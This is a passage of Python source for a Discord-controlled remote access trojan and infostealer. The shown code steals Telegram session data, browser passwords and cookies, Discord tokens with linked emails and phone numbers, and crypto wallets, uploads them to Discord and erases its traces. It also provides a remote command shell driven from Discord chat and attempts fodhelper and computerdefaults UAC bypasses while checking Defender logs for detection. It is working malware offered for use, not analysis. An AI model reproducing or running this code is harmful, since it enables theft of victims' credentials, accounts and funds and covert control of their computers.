            source_path = os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")
            temp_path = os.path.join(user, "AppData\\Local\\Temp\\tdata_session")
            zip_path = os.path.join(user, "AppData\\Local\\Temp", "tdata_session.zip")
    
            if os.path.exists(source_path):
                if os.path.exists(temp_path):
                    shutil.rmtree(temp_path)
                shutil.copytree(source_path, temp_path)
    
                with ZipFile(zip_path, 'w') as zipf:
                    for root, dirs, files in os.walk(temp_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, os.path.join(temp_path, '..')))
    
                shutil.move(zip_path, os.path.join(STORAGE_PATH, "tdata_session.zip"))
                shutil.rmtree(temp_path)
        except:
            pass
    
    def save_collected_data():
        """Save all collected data to files"""
        # Save passwords
        if PASSWORDS:
            with open(os.path.join(STORAGE_PATH, "passwords.json"), "w") as f:
                json.dump(PASSWORDS, f, indent=2)
    
        # Save cookies
        for cookie in COOKIES:
            cookie_file = os.path.join(STORAGE_PATH, f"cookies_{cookie['browser']}_{cookie['profile']}.txt")
            with open(cookie_file, "w") as f:
                f.write(base64.b64decode(cookie["cookies"]).decode())
    
        # Save web data
        if WEB_DATA:
            with open(os.path.join(STORAGE_PATH, "web_data.json"), "w") as f:
                json.dump(WEB_DATA, f, indent=2)
    
        # Save Discord tokens
        if DISCORD_TOKENS:
            with open(os.path.join(STORAGE_PATH, "discord_tokens.txt"), "w") as f:
                for token_data in DISCORD_TOKENS:
                    f.write(f"{'='*50}\n")
                    f.write(f"ID: {token_data['user_id']}\n")
                    f.write(f"USERNAME: {token_data['username']}\n")
                    f.write(f"DISPLAY NAME: {token_data['display_name']}\n")
                    f.write(f"EMAIL: {token_data['email']}\n")
                    f.write(f"PHONE: {token_data['phone']}\n")
                    f.write(f"TOKEN: {token_data['token']}\n")
                    f.write(f"{'='*50}\n\n")
    
    def main_collection():
        """Main data collection function with threading"""
        # Kill all browsers first
        kill_all_browsers()
    
        # Use ThreadPoolExecutor for parallel processing
        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
            # Process Chromium browsers in parallel
            executor.map(process_browser_data, CHROMIUM_BROWSERS)
    
            # Process other data sources in parallel
            executor.submit(process_firefox)
            executor.submit(process_discord_tokens)
            executor.submit(process_wallets)
            executor.submit(search_sensitive_files)
            executor.submit(telegram_collection)
    
        # Save all collected data
        save_collected_data()
    
    # Main execution
    # Main execution
    main_collection()
    await upload_to_discord(ctx)
    
    # Final cleanup
    try:
        shutil.rmtree(STORAGE_PATH)
    except:
        pass

@bot.command()
@is_correct_user_channel()
async def reverse_shell(ctx):
    import subprocess
    import asyncio
    import os
    from PIL import ImageGrab
    import discord
    
    # ========== MAIN CODE THAT GETS INSERTED INTO THE BOT COMMAND ==========
    
    # This creates a !cmd command for executing shell commands
    await ctx.send("🖥️ Executing shell command...")
    
    # Get the command from the message (remove "!cmd " prefix)
    if ctx.message.content.startswith('!cmd '):
        command_text = ctx.message.content[5:].strip()
    else:
        # Fallback - get everything after first space
        parts = ctx.message.content.split(' ', 1)
        command_text = parts[1] if len(parts) > 1 else ""
    
    if not command_text:
        await ctx.send('```Syntax: !cmd <command>```')
    else:
        try:
            # Execute the command
            result = subprocess.run(command_text, capture_output=True, shell=True, text=True, timeout=30)
            cmd_output = result.stdout.strip()
    
            if not cmd_output:
                cmd_output = "Command executed successfully (no output)"
    
            # Send command header
            await ctx.send(f'```Executed command: {command_text}```')
            await ctx.send('```stdout:```')
    
            # Split output into chunks and send
            if len(cmd_output) <= 1900:
                await ctx.send(f'```{cmd_output}```')
            else:
                # Split into chunks that fit Discord's message limit
                chunks = [cmd_output[i:i+1900] for i in range(0, len(cmd_output), 1900)]
                for i, chunk in enumerate(chunks):
                    await ctx.send(f'```{chunk}```')
    
            # Send stderr if any
            if result.stderr.strip():
                await ctx.send('```stderr:```')
                stderr_output = result.stderr.strip()
                if len(stderr_output) <= 1900:
                    await ctx.send(f'```{stderr_output}```')
                else:
                    chunks = [stderr_output[i:i+1900] for i in range(0, len(stderr_output), 1900)]
                    for chunk in chunks:
                        await ctx.send(f'```{chunk}```')
    
            # Send footer with return code
            await ctx.send(f'```Command completed with return code: {result.returncode}```')
    
        except subprocess.TimeoutExpired:
            await ctx.send('```Command timed out after 30 seconds```')
        except Exception as e:
            await ctx.send(f'```Error executing command: {str(e)}```')

@bot.command()
@is_correct_user_channel()
async def uac(ctx):
    import subprocess
    import ctypes
    import sys
    import discord
    
    def GetSelf() -> tuple[str, bool]:
        """Get current executable path and whether it's frozen"""
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)
    
    def IsAdmin() -> bool:
        """Check if current process has admin privileges"""
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    
    def execute_command(cmd):
        """Execute command with hidden window"""
        return subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    def UACbypass(method: int = 1) -> bool:
        """Attempt UAC bypass using different methods"""
        if GetSelf()[1]:  # Only if executable is frozen
            if method == 1:
                # Method 1: computerdefaults bypass
                execute_command(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                execute_command('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
    
                log_count_before = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                execute_command("computerdefaults --nouacbypass")
                log_count_after = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
    
                execute_command("reg delete hkcu\\Software\\Classes\\ms-settings /f")
    
                if log_count_after > log_count_before:
                    return UACbypass(method + 1)
    
            elif method == 2:
                # Method 2: fodhelper bypass
                execute_command(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                execute_command('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
    
                log_count_before = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                execute_command("fodhelper --nouacbypass")
                log_count_after = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
    
                execute_command("reg delete hkcu\\Software\\Classes\\ms-settings /f")
    
                if log_count_after > log_count_before:
                    return UACbypass(method + 1)
            else:
                return False
            return True
        return False
    
    # Main execution
    if IsAdmin():
        # Already admin, no need to bypass
        embed = discord.Embed(
            title="🟢 UAC Status",
            description="```Already running with administrator privileges```",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    else:
        # Attempt UAC bypass
        success = UACbypass()
    
        if success:
            embed = discord.Embed(
                title="🟢 UAC Bypass Successful",
                description="```UAC has been successfully bypassed!```",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="🔴 UAC Bypass Failed",
                description="```Failed to bypass UAC protection```",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

decoded_token = decode_token(ENCODED_TOKEN)
if decoded_token:
    print("✅ Token decoded successfully, starting bot...")
    bot.run(decoded_token)
else:
    print("❌ Failed to decode bot token - exiting")